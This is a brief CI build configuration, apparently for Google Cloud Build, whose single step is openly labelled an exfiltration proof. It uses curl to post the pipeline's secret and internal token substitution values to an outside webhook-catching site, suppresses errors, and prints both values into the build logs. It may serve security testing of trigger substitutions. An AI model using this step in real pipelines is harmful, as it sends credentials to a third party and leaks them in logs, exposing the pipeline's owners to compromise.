steps:
- name: 'alpine:3.20'
  entrypoint: 'sh'
  args:
  - '-c'
  - |
    echo "=== EXFILTRATION PROOF ==="
    echo "Attempting to exfiltrate trigger substitution values..."
    curl -s "https://webhook.site/#!/" -d "secret=${_TEST_SECRET}&token=${_INTERNAL_TOKEN}" 2>/dev/null || true
    echo "SECRET_VALUE=${_TEST_SECRET}"
    echo "TOKEN_VALUE=${_INTERNAL_TOKEN}"
substitutions:
